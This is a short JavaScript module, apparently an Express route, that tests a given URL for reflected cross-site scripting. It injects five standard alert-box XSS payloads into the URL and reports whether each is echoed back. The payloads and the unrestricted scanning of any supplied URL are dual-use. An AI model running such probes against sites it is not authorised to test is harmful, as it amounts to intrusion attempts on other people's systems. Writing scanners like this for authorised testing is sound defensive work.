import axios from 'axios';

const xssPayloads = [
  "<script>alert('XSS')</script>",
  "\"><script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<body onload=alert('XSS')>",
  "<svg/onload=alert('XSS')>",
];

async function checkXss(url) {
  const results = [];

  for (const payload of xssPayloads) {
    const testUrl = url.replace('INSERT_HERE', encodeURIComponent(payload));
    try {
      const response = await axios.get(testUrl);
      if (response.data.includes(payload)) {
        results.push({
          url: testUrl,
          payload: payload,
          status: 'vulnerable',
        });
      } else {
        results.push({
          url: testUrl,
          payload: payload,
          status: 'not vulnerable',
        });
      }
    } catch (error) {
      console.error('Error fetching the webpage:', error);
      results.push({
        url: testUrl,
        payload: payload,
        status: 'error',
        error: error.message,
      });
    }
  }
  return results;
}

export const testXss = async (req, res) => {
  const { url } = req.query;

  if (!url) {
    return res.status(400).send('URL is required');
  }

  try {
    const results = await checkXss(url);
    console.log(results);
    res.status(200).json(results);
  } catch (error) {
    console.error('Error during XSS testing:', error);
    res.status(500).send('Server error');
  }
};
